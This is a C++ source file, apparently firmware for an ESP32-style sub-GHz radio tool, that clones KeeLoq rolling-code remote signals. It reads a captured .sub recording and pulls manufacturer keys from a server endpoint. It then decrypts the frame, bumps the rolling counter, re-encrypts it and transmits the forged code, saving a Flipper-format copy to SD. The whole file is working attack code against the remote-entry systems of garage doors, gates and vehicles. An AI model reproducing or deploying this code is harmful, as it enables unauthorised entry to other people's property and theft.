// KeeLoqClone.cpp — see header.
#include "KeeLoqClone.h"

#include <Arduino.h>
#include <SD.h>
#include <WiFi.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <string>

#include "BinRawDecoder.h"
#include "SubGhz.h"
#include "WaveKai/WaveKaiClient.h"

// NOTE: Display/Event.h defines `uint8_t currentState = STATE_IDLE;` as a
// global at file scope and may only be included from main.cpp. So we
// extern currentState below and write the enum integer value
// (STATE_SEND_FLIPPER == 9, per the enum order in Event.h).
static const uint8_t STATE_SEND_FLIPPER_VAL = 9;

extern SubGhz SUBGHZ;

// Defined in src/SD/SDCard.h (included via main.cpp) and Event.h:
extern float    tempFreq;
extern int      tempSample[];
extern int      tempSampleCount;
extern uint8_t  currentState;

namespace KeeLoqClone {

char     lastClonePath[96]    = {0};
uint16_t lastCloneOldCounter  = 0;
uint16_t lastCloneNewCounter  = 0;

// ---------------------------------------------------------------------------
// parseSubFileAsKeeLoq — extract first 66-bit KeeLoq frame from a .sub
// ---------------------------------------------------------------------------
bool parseSubFileAsKeeLoq(const char *path,
                          KeeLoq::Frame &out_frame,
                          char out_bits67[67])
{
    if (!path || !out_bits67) return false;

    File f = SD.open(path, FILE_READ);
    if (!f) return false;

    // Concatenate RAW_Data lines (cap 64 KB).
    static const size_t RAW_CAP = 64 * 1024;
    std::string raw;
    raw.reserve(4096);

    while (f.available() && raw.size() < RAW_CAP) {
        String line = f.readStringUntil('\n');
        const char *s = line.c_str();
        while (*s == ' ' || *s == '\t') s++;
        if (strncmp(s, "RAW_Data:", 9) != 0) continue;
        const char *vals = s + 9;
        while (*vals == ' ' || *vals == '\t') vals++;
        size_t want = strlen(vals);
        if (raw.size() + want + 1 > RAW_CAP) {
            want = (raw.size() < RAW_CAP) ? (RAW_CAP - raw.size() - 1) : 0;
        }
        if (want > 0) {
            raw.append(vals, want);
            raw.push_back(' ');
        }
    }
    f.close();

    if (raw.empty()) return false;

    int32_t *timings = NULL;
    size_t n = BinRaw::parse_raw_data(raw.c_str(), &timings);
    if (n == 0 || !timings) {
        if (timings) free(timings);
        return false;
    }

    BinRaw::Result r;
    bool ok = BinRaw::analyze(timings, n, r);
    free(timings);
    if (!ok) return false;

    // Sanity: KeeLoq is PWM @ Te ~400us. Real captures (and the server's
    // own KeeLoq decoder) often only see 64 bits — the trailing 2 status
    // bits are sometimes dropped by the transmitter or absorbed into a
    // long final mark by the BinRaw analyzer. Accept 64 and zero-pad the
    // missing status bits on the way out, so the cipher block (the first
    // 32 bits) still decrypts correctly.
    if (r.encoding != BinRaw::ENC_PWM)        return false;
    if (r.te_us < 200 || r.te_us > 600)       return false;
    if (r.bit_count < 64)                     return false;

    // Heuristic: skip the preamble. KeeLoq HCS200/300 preamble is 12 pairs
    // of short pulses (24 "0" bits when analyzed as PWM) followed by a long
    // header gap. The BinRaw analyzer typically pushes through preamble as
    // a run of identical bits. We look for the first window of at least
    // 64 bits containing both ones and zeros — i.e., the data portion.
    const int frame_bits = (r.bit_count >= 66) ? 66 : 64;
    int start = -1;
    for (int i = 0; i + frame_bits <= r.bit_count; ++i) {
        bool have0 = false, have1 = false;
        for (int j = 0; j < frame_bits; ++j) {
            if (r.bits[i + j] == '0') have0 = true;
            else if (r.bits[i + j] == '1') have1 = true;
            if (have0 && have1) break;
        }
        if (have0 && have1) { start = i; break; }
    }
    if (start < 0) return false;

    memcpy(out_bits67, r.bits + start, frame_bits);
    // If we only have 64 bits, zero-pad the trailing status bits so
    // the downstream parseFrame() still consumes a full 66-bit string.
    for (int i = frame_bits; i < 66; ++i) out_bits67[i] = '0';
    out_bits67[66] = '\0';

    return KeeLoq::parseFrame(out_bits67, out_frame);
}

// ---------------------------------------------------------------------------
// fetchKeeLoqKeys — pull manufacturer keys from server, cache to SD
// ---------------------------------------------------------------------------
//
// Endpoint: GET http://<server>/api/keeloq/keys
//
// Expected response shape (TODO: confirm with server team; this matches
// the schema described in the task brief — if the endpoint doesn't exist
// yet, the WiFi branch just returns the cached list or an empty vector):
//   { "keys": [
//       { "id": 1, "name": "NICE Flo",  "key": "0x0123456789ABCDEF" },
//       { "id": 2, "name": "FAAC SLH",  "key": "0xFEDCBA9876543210" },
//       ...
//   ] }
//
// 64-bit key may be sent as "0x..16hex.." OR plain "..16hex..".
static const char *KEELOQ_KEY_CACHE_PATH = "/captures/keeloq_keys.json";
static const char *KEELOQ_KEYS_ENDPOINT  = "/api/keeloq/keys";

static uint64_t parse_hex64(const char *s) {
    if (!s) return 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
    uint64_t v = 0;
    while (*s) {
        char c = *s++;
        uint8_t nib;
        if      (c >= '0' && c <= '9') nib = c - '0';
        else if (c >= 'a' && c <= 'f') nib = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') nib = c - 'A' + 10;
        else break;
        v = (v << 4) | nib;
    }
    return v;
}

static bool parse_keys_json(const String &body, std::vector<KeyEntry> &out) {
    // Allow up to ~200 keys at ~80 bytes each.
    DynamicJsonDocument doc(24576);
    DeserializationError err = deserializeJson(doc, body);
    if (err) return false;
    JsonArray arr = doc["keys"].as<JsonArray>();
    if (arr.isNull()) return false;
    for (JsonObject obj : arr) {
        KeyEntry e;
        e.name = obj["name"].as<const char*>() ? String(obj["name"].as<const char*>()) : String("(unknown)");
        const char *kstr = obj["key"].as<const char*>();
        e.key = parse_hex64(kstr);
        if (e.key != 0) out.push_back(e);
    }
    return true;
}

static void save_cache(const String &body) {
    File f = SD.open(KEELOQ_KEY_CACHE_PATH, FILE_WRITE);
    if (!f) return;
    f.print(body);
    f.close();
}

static bool load_cache(std::vector<KeyEntry> &out) {
    File f = SD.open(KEELOQ_KEY_CACHE_PATH, FILE_READ);
    if (!f) return false;
    String body;
    body.reserve(f.size() + 1);
    while (f.available()) body += (char)f.read();
    f.close();
    return parse_keys_json(body, out);
}

std::vector<KeyEntry> fetchKeeLoqKeys() {
    std::vector<KeyEntry> out;

    if (WiFi.status() == WL_CONNECTED) {
        HTTPClient http;
        String url = String(WAVEKAI_SERVER) + KEELOQ_KEYS_ENDPOINT;
        http.begin(url);
        http.setTimeout(5000);
        int code = http.GET();
        if (code == 200) {
            String body = http.getString();
            http.end();
            if (parse_keys_json(body, out)) {
                save_cache(body);
                return out;
            }
        } else {
            http.end();
        }
    }

    // Network failed (or no WiFi) — try cache.
    load_cache(out);
    return out;
}

// ---------------------------------------------------------------------------
// transmitKeeLoqClone — bump counter, re-encrypt, render timings, write
// .sub, and trigger TX through SUBGHZ.sendSamples().
// ---------------------------------------------------------------------------
//
// PWM symbol shape (Microchip HCS300):
//   '0' = +Te    mark,  -2*Te space  (short mark, long space)
//   '1' = +2*Te  mark,  -Te    space
// Te ≈ 400 us.
//
// HCS300 preamble: 23 short pulses (alternating +/-Te), then a long header
// gap (~10*Te low). That gives the receiver a baseline + AGC lock.
// Total bit-window is then 66 data bits MSB-first... wait, OTA is LSB-first
// per field. We use the bit string built by KeeLoq::buildFrame() which is
// already in OTA temporal order — output the symbols left→right.

static const int KEELOQ_TE_US     = 400;
static const int KEELOQ_PREAMBLE  = 12;   // pairs of short pulses

bool transmitKeeLoqClone(const KeeLoq::Frame &original,
                         uint64_t key,
                         uint16_t counter_inc,
                         float freq_mhz)
{
    // Decrypt → bump counter → re-encrypt.
    KeeLoq::Plain p = KeeLoq::decodePlain(original.encrypted, key);
    lastCloneOldCounter = p.counter;
    p.counter = (uint16_t)(p.counter + counter_inc);
    lastCloneNewCounter = p.counter;

    KeeLoq::Frame clone = original;
    clone.encrypted = KeeLoq::encodePlain(p, key);

    // Render OTA bit string.
    char bits67[67];
    KeeLoq::buildFrame(clone, bits67);

    // Build Flipper-style timing array.
    // Capacity: preamble (24) + 1 header gap + 66 bits * 2 symbols = ~159
    static const int MAX_TIMINGS = 256;
    int32_t timings[MAX_TIMINGS];
    int n = 0;

    // Preamble: KEELOQ_PREAMBLE pairs of (+Te, -Te)
    for (int i = 0; i < KEELOQ_PREAMBLE && n + 2 <= MAX_TIMINGS; ++i) {
        timings[n++] =  KEELOQ_TE_US;
        timings[n++] = -KEELOQ_TE_US;
    }
    // Header gap: long low after last short high. Replace the previous
    // -Te with the header gap (~10*Te low).
    if (n > 0) {
        timings[n - 1] = -10 * KEELOQ_TE_US;
    }

    // Data bits — Microchip HCS300 PWM:
    //   '1' = +2Te mark, -Te space    (long mark)
    //   '0' = +Te  mark, -2Te space   (short mark)
    for (int i = 0; i < 66 && n + 2 <= MAX_TIMINGS; ++i) {
        if (bits67[i] == '1') {
            timings[n++] =  2 * KEELOQ_TE_US;
            timings[n++] = -1 * KEELOQ_TE_US;
        } else {
            timings[n++] =  1 * KEELOQ_TE_US;
            timings[n++] = -2 * KEELOQ_TE_US;
        }
    }

    // Persist a .sub file mirroring Flipper's RAW format for traceability.
    snprintf(lastClonePath, sizeof(lastClonePath),
             "/captures/clone_%lu.sub", (unsigned long)millis());
    SD.mkdir("/captures");
    File out = SD.open(lastClonePath, FILE_WRITE);
    if (out) {
        out.println("Filetype: Flipper SubGhz RAW File");
        out.println("Version: 1");
        out.printf("Frequency: %lu\n", (unsigned long)(freq_mhz * 1000000.0f));
        out.println("Preset: FuriHalSubGhzPresetOok650Async");
        out.println("Protocol: RAW");
        out.print("RAW_Data:");
        for (int i = 0; i < n; ++i) {
            out.print(' ');
            out.print(timings[i]);
        }
        out.println();
        out.close();
    }

    // Hand off through the same path PLAY uses: set globals and let the
    // STATE_SEND_FLIPPER state machine on Core 1 actually TX. The externs
    // live at global namespace scope (defined in SDCard.h / Event.h), so
    // we have to escape the `KeeLoqClone` namespace to reference them.
    ::tempFreq = freq_mhz;
    ::tempSampleCount = n;
    for (int i = 0; i < n; ++i) ::tempSample[i] = timings[i];

    ::currentState = STATE_SEND_FLIPPER_VAL;
    return true;
}

}  // namespace KeeLoqClone
